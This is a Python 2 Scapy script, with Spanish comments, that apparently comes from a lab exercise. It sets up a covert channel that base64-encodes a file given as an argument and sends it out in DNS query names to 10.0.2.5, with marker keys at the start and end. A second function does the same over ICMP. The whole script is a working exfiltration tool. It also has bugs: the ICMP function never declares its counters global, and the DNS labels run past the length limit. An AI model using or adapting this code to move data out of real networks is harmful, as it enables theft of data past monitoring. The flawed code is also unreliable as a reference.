#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import binascii
import base64
import sys
import os

# construimos la capa 3 del paquete (IP)
l3 = IP()
l3.dst = "10.0.2.5"

# construimos la capa 4 del paquete (ICMP)
l4 = ICMP()

l4_UDP = UDP()
l4_UDP.dport=53

l4_TCP = TCP()
l4_TCP.dport=53
l7 = DNS()

key = "12345678" # con esta clave vamos a diferenciar nuestros paquetes de los otros paquetes ICMP que van a llegar al host"
msgsize = 12  #como vamos a dividir el mensaje en partes,aqui definimos el tamano de cada parte
#payload = "" # declaramos la variable 'payload' que vamos a utilizar mas adelante

data = "Datos a enviar por el canal encubierto"

# las variables 'first', 'last' y 'count' las vamos a utilizar para el proceso de cada parte del mensaje
first = 0
last = msgsize
count = (len(data)/msgsize)+1

def convert_file_to_hex(path_to_file='/home/javier/Pictures/skydiving-katrina.jpg'):
    with open(path_to_file,'rb') as f:
        content=f.read()

    out=binascii.hexlify(content)
    return out

def convert_file_to_b64(path_to_file='/home/javier/Pictures/skydiving-katrina.jpg'):
    with open(path_to_file,'rb') as f:
        str=base64.b64encode(f.read())
    return str

def convert_b64_to_file(file_in_b64,path_to_save='/home/javier/Pictures/skydiving-katrina-from-base64.jpg'):
    print path_to_save
    file_new=open(path_to_save,'wb+')
    file_new.write(file_in_b64.decode('base64'))
    file_new.close()


def send_file_icmp():
    print "fist {}".format(first) 
    for a in range(0, count):
        print "Enviando la parte %s de %s ... (%s)" %(a + 1, count, data[first:last])
        payload = key + data[first:last]
        pkt = l3/l4/payload
        a = sr(pkt, verbose = 1, retry = 0, timeout = 1)
        first += msgsize
        last += msgsize
        print "Se han terminado de enviar los datos"

def send_file_dns(file_to_send,chunk_size):
    key="12345678"
    first=0
    last=chunk_size
    numbers_of_chunk=(len(file_to_send)/chunk_size)+1
    print 'La longitud del mensaje es: {}'.format(len(file_to_send))
    print 'El mensaje es dividido en: {}'.format(numbers_of_chunk)
    payload=""
    for a in range (0,numbers_of_chunk):
        print 'imprimo a= {}'.format(a)
        print 'imprimo numbers_of_chunk= {}'.format(numbers_of_chunk)
        data=file_to_send[first:last]
        data_split_chunks=(len(data)/60) + 1
        data_first=0
        data_last=60
        data_dot=""
        if a==numbers_of_chunk-1:
            key="87654321"
        for tag in range (0,data_split_chunks):
            #print "bloque_puntos: {}".format(data[data_first:data_last])
            data_dot+="." + data[data_first:data_last]
            data_first+=60
            data_last+=60
        payload=key+data_dot
        print 'payload: {}'.format(payload)
        pacote=l3/l4_UDP/DNS(rd=1,qd=DNSQR(qname=payload))
        a=sr1(pacote,verbose = 0, retry = 0, timeout = 1)
        first += chunk_size
        last += chunk_size



def main():
    wd=os.getcwd()
    print wd
    b64file=convert_file_to_b64(sys.argv[1])

    print "Longitud del mensaje: {}".format(len(b64file))
    #send_file_dns('Olvido todo ese frio reunido de una sola vez Debes en cuando cada tanto los juegos prohibidos nos sacan ese frio Escurro entre tus dedos tus canciones tus mitos hoooooooooy',246)
    send_file_dns(b64file,246)
    print "MENSAJE ENVIADO"
main()
